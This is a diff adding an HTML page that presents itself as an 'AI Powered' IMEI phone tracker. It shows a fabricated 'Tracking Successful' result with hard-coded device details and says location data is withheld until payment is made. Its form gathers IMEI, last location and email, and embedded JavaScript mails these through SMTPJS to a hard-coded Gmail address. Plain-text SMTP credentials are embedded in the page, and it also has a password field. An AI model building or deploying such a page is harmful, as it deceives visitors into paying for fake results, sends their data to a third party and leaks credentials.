@@ -1,0 +1,184 @@
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src='loginScript.js'>  </script>
+    <script src='script2.js'>  </script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link rel="stylesheet" href="styles2.css"></head>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+<body>
+
+
+
+
+
+
+
+
+    <div class="cardPhone" id="cardPhoneId"> 
+        <button class="dismissPhone" type="button" onClick="dismiss()">×</button> 
+                  <script>
+                         function dismiss(){
+                            myCardPhone= document.getElementById("cardPhoneId");
+                            myCardPhone.style.display=("none");
+                         }
+                    </script>
+
+            
+<input placeholder="Enter Password" type="text" name="text" class="input" id="tef">
+
+<button onclick="proceed()"> Continue</button>
+
+
+        <div class="headerPhone" id="headerId"> 
+          <div class="imagePhone">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M20 7L9.00004 18L3.99994 13" stroke="#000000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg>
+            </div> 
+
+            <div class="contentPhone">
+               <span class="titlePhone">Tracking Successful</span> 
+               <p class="messagePhone">
+
+                IMEI: 350222490259914<br/>
+                Brand: Tecno<br/>
+                Model: KE5<br/>
+                Model Name: Spark Go 2020
+
+                IMEI.info:
+Device type:
+Smartphone
+Design:
+Classic
+DualSIM:
+YES icon
+SIM card size:
+Mini Sim - Regular, Mini Sim - Regular
+GSM:
+YES icon
+850 900 1800 1900
+HSDPA:
+YES icon
+850 900 2100
+LTE:
+YES icon
+LTE-FDD: 700, 800, 850, 900, 1800, 2100, 2600
+
+YES icon
+LTE-TDD: 2300, 2500, 2600<br/>
+<font color="#ff0000">
+Location and other informtion has been filtered.Payment is required to view all the tracking details.</font>
+
+
+
+               </p> 
+               </div> 
+               <div class="actionsPhone">
+                  <button class="historyPhone" type="button" onClick="payPhone()">Make Payment</button> 
+                           <script>
+                                 function payPhone(){
+                                    window.location.href="payment.html";
+                                 }
+                           </script>
+                  <button class="trackPhone" type="button">Cancel</button> 
+                  </div> 
+                  </div> 
+                  </div>
+
+    
+     
+
+
+
+    <div class="topDiv"> 
+       <svg width="40" height="40" fill="none" onclick="openNav()" stroke="#c0c0c0" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+             <path d="M3 12h18"></path>
+             <path d="M3 6h18"></path>
+             <path d="M3 18h18"></path>
+       </svg>
+       <p class="aiPow" type="button" onClick="viewInfo()"> AI Powered </p>    
+    </div> <!---_Nav_---> 
+
+          <div class="container">
+	          <div class="loader"></div>
+	          <div class="loader"></div>
+	          <div class="loader"></div>
+          </div>
+
+     
+    
+<form class="form" id="myForm">
+    
+    <span class="signup">Fill In The Form</span>
+    
+    
+    <label for="usernameField" class="usernamelabel label">Input IMEi</label>
+    <input type="text" placeholder="IMEi" id="imeiField" required="required">
+    
+    
+    <label for="usernameField" class="usernamelabel label">Last Known Location</label>
+    <input type="text" placeholder="Last location" id="locationField" required="required">
+    
+    
+    <label for="usernameField" class="usernamelabel label">Email</label>
+    <input type="text" placeholder="Where to receive alerts" id="emailField">
+    
+    
+    
+    
+    <div class="form--marketing">
+        <input id="okayToEmail" type="checkbox">
+        <label for="okayToEmail" class="checkbox">
+          I have accepted the Terms and Conditions
+        </label>
+    </div>
+    <button class="form--submit" type="submit" >
+        Submit
+    </button>
+</form>
+
+
+
+<script type='text/javascript'>
+    function submitForm() {
+      event.preventDefault(); //prevent default behavior
+  
+      //get values from inputs
+      var subject = document.getElementById("imeiField").value;
+      var body = document.getElementById("locationField").value;
+      var email = document.getElementById("emailField").value;
+  
+       //display values in alert box
+       alert(`Received,Processed information will be automatically sent to your mail.`);
+
+       Email.send({
+	   Host: "smtp.elasticemail.com",
+	   Username : "maselecybernetics@gmail.com",
+	   Password : "BA3B28BF5DD81DA9024CDF816A661E054D5B",
+	   To : 'gmasele15@gmail.com',
+	   From : "maselecybernetics@gmail.com",
+	   Subject : email,
+	   Body : "LastKnownLocation: "+body+"--IMEi: "+subject,
+	   }).then(
+		 message => alert("Received,infromation will be automatically sent to your mail or phone number.Keep checking your mail")
+	   );
+
+
+
+    }
+  
+    document.getElementById("myForm").addEventListener("submit", submitForm);
+ </script>
+
+
+
+
+
+
+
+
+
+</body>
+</html>
+
+
+
